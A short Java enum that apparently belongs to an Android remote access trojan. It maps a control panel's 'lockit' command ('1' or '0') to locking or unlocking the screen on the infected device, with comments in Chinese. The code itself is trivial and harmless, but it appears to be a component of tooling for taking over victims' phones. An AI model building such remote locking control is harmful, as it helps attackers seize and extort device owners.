package com.vendor.rat.control.handler;

/**
 * 锁屏动作枚举
 * Panel lockit → APK 动作映射
 */
public enum LockAction {
    LOCK,     // "1" → 锁屏
    UNLOCK,   // "0" → 解锁
    UNKNOWN;

    public static LockAction fromState(String state) {
        if (state == null) return UNLOCK;
        switch (state) {
            case "1": return LOCK;
            case "0": return UNLOCK;
            default:  return UNKNOWN;
        }
    }
}
